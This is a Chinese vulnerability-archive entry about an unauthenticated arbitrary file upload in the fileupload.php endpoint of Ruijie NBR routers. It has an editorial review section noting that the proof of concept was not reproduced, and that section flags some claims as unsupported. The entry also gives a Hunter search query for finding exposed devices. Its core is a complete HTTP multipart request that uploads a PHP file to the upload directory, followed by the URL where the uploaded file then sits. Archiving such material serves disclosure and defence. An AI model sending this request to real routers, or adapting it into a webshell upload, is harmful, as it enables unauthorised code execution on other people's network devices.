---
source: "wy876 漏洞文库"
id: "vw-d2673bd11834d75b81b13de6"
entity_id: "ve-d2673bd11834d75b81b13de6"
schema_version: "1"
title: "锐捷NBR路由器fileupload.php任意文件上传漏洞"
product: "Ruijie NBR EWEB"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie请求，upload目录可写/PHP解析；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8fileupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ydw1qor2zc4dv3k8"
source_status: "recorded"
previous_fofa_unverified: "app.name=="
hunter: "app.name==\"Ruijie 锐捷 EWEB\""
---

# 锐捷NBR路由器fileupload.php任意文件上传漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie NBR EWEB
- 本文讨论：ddi/server/fileupload.php任意文件上传
- 版本、权限与配置前提：无Cookie请求，upload目录可写/PHP解析；版本未知
- 资料类型：上传PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- multipart字段完整，但没有上传响应/执行证据
- 从phpinfo上传泛化数据中心/横向渗透等缺支撑；NBR英文释义无来源
- Hunter残缺到fofa，缺修复版本
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 固件范围、上传目录解析与权限待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
锐捷NBR路由器是锐捷网络科技有限公司推出的一款高性能企业级路由器。NBR是"Next-Generation Broadband Router"的缩写，意为"下一代宽带路由器"。该路由器具有强大的处理能力和丰富的功能，适用于中小型企业、校园网络和数据中心等场景。锐捷 NBR 路由器 存在任意文件上传漏洞，可能导致执行恶意代码、服务器拒绝服务、数据泄露、网站篡改和横向渗透等危害。

# 二、影响版本
+ 锐捷NBR路由器

# 三、资产测绘
+ hunter`app.name=="Ruijie 锐捷 EWEB"`
+ 登录页面


# 四、漏洞复现
```http
POST /ddi/server/fileupload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 219

--00content0boundary00
Content-Disposition: form-data; name="uploadDir"

upload
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php"

<?php phpinfo();?>
--00content0boundary00--

```


上传文件位置

```plain
https://xx.xx.xx.xx/ddi/server/upload/1.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ydw1qor2zc4dv3k8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
